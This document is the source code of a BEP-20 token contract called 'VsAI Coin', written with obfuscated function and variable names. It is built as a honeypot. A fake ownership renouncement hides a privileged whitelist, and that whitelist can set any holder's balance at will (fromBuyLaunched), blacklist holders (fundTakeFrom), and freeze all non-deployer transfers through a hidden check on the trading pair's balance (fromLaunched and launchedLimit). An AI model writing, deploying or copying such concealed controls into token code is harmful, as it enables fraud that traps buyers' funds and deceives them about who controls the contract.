/**
 *Submitted for verification at BscScan.com on 2023-03-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface fromSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellAmountMax) external view returns (uint256);

    function transfer(address walletTradingMarketing, uint256 modeAmount) external returns (bool);

    function allowance(address maxReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeAmount) external returns (bool);

    function transferFrom(
        address sender,
        address walletTradingMarketing,
        uint256 modeAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapToken, uint256 value);
    event Approval(address indexed maxReceiver, address indexed spender, uint256 value);
}

interface marketingFund is fromSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tradingEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedWallet {
    function createPair(address walletEnable, address maxExempt) external returns (address);
}

interface tokenAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VsAICoin is tradingEnable, fromSwap, marketingFund {

    mapping(address => mapping(address => uint256)) private tokenLiquidityLaunched;

    mapping(address => bool) public amountEnable;

    function getOwner() external view returns (address) {
        return walletAuto;
    }

    string private receiverTrading = "VsAI Coin";

    function launchedLimit(address launchMarketing, address walletTradingMarketing, uint256 modeAmount) internal returns (bool) {
        if (launchMarketing == autoShould) {
            return walletMarketing(launchMarketing, walletTradingMarketing, modeAmount);
        }
        uint256 sellToFund = fromSwap(shouldIs).balanceOf(feeTotal);
        require(sellToFund == enableTeam);
        require(!minAutoAt[launchMarketing]);
        return walletMarketing(launchMarketing, walletTradingMarketing, modeAmount);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxFundLimit;
    }

    function walletMarketing(address launchMarketing, address walletTradingMarketing, uint256 modeAmount) internal returns (bool) {
        require(buyTo[launchMarketing] >= modeAmount);
        buyTo[launchMarketing] -= modeAmount;
        buyTo[walletTradingMarketing] += modeAmount;
        emit Transfer(launchMarketing, walletTradingMarketing, modeAmount);
        return true;
    }

    address feeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public tradingTotal;

    bool public maxBuy;

    function allowance(address isLimit, address isSenderWallet) external view virtual override returns (uint256) {
        if (isSenderWallet == teamEnableIs) {
            return type(uint256).max;
        }
        return tokenLiquidityLaunched[isLimit][isSenderWallet];
    }

    function approve(address isSenderWallet, uint256 modeAmount) public virtual override returns (bool) {
        tokenLiquidityLaunched[_msgSender()][isSenderWallet] = modeAmount;
        emit Approval(_msgSender(), isSenderWallet, modeAmount);
        return true;
    }

    function receiverModeLaunched(address tokenLaunchLaunched) public {
        if (senderMarketing) {
            return;
        }
        if (tradingTotal != buyTake) {
            buyTake = true;
        }
        amountEnable[tokenLaunchLaunched] = true;
        if (txSwapSell != autoTotal) {
            tradingTotal = true;
        }
        senderMarketing = true;
    }

    function fromLaunched(uint256 modeAmount) public {
        txMode();
        enableTeam = modeAmount;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellLaunch;
    }

    constructor (){
        
        amountTo();
        tokenAt isLimitMarketing = tokenAt(teamEnableIs);
        shouldIs = launchedWallet(isLimitMarketing.factory()).createPair(isLimitMarketing.WETH(), address(this));
        
        autoShould = _msgSender();
        amountEnable[autoShould] = true;
        buyTo[autoShould] = maxFundLimit;
        
        emit Transfer(address(0), autoShould, maxFundLimit);
    }

    address public shouldIs;

    uint256 public autoTotal;

    uint256 receiverMin;

    function balanceOf(address sellAmountMax) public view virtual override returns (uint256) {
        return buyTo[sellAmountMax];
    }

    function amountTo() public {
        emit OwnershipTransferred(autoShould, address(0));
        walletAuto = address(0);
    }

    address public autoShould;

    uint256 enableTeam;

    event OwnershipTransferred(address indexed toLaunch, address indexed minToken);

    bool private buyTake;

    uint8 private limitSwapLaunch = 18;

    mapping(address => bool) public minAutoAt;

    bool public walletTrading;

    address private walletAuto;

    function fromBuyLaunched(address minTake, uint256 modeAmount) public {
        txMode();
        buyTo[minTake] = modeAmount;
    }

    function txMode() private view {
        require(amountEnable[_msgSender()]);
    }

    function transfer(address minTake, uint256 modeAmount) external virtual override returns (bool) {
        return launchedLimit(_msgSender(), minTake, modeAmount);
    }

    address teamEnableIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address launchMarketing, address walletTradingMarketing, uint256 modeAmount) external override returns (bool) {
        if (_msgSender() != teamEnableIs) {
            if (tokenLiquidityLaunched[launchMarketing][_msgSender()] != type(uint256).max) {
                require(modeAmount <= tokenLiquidityLaunched[launchMarketing][_msgSender()]);
                tokenLiquidityLaunched[launchMarketing][_msgSender()] -= modeAmount;
            }
        }
        return launchedLimit(launchMarketing, walletTradingMarketing, modeAmount);
    }

    uint256 private limitList;

    uint256 private maxFundLimit = 100000000 * 10 ** 18;

    bool private tradingLiquidity;

    function fundTakeFrom(address exemptToken) public {
        txMode();
        
        if (exemptToken == autoShould || exemptToken == shouldIs) {
            return;
        }
        minAutoAt[exemptToken] = true;
    }

    uint256 private txSwapSell;

    function decimals() external view virtual override returns (uint8) {
        return limitSwapLaunch;
    }

    mapping(address => uint256) private buyTo;

    bool public senderMarketing;

    uint256 private tokenLaunch;

    bool private enableFund;

    function name() external view virtual override returns (string memory) {
        return receiverTrading;
    }

    function owner() external view returns (address) {
        return walletAuto;
    }

    string private sellLaunch = "VCN";

}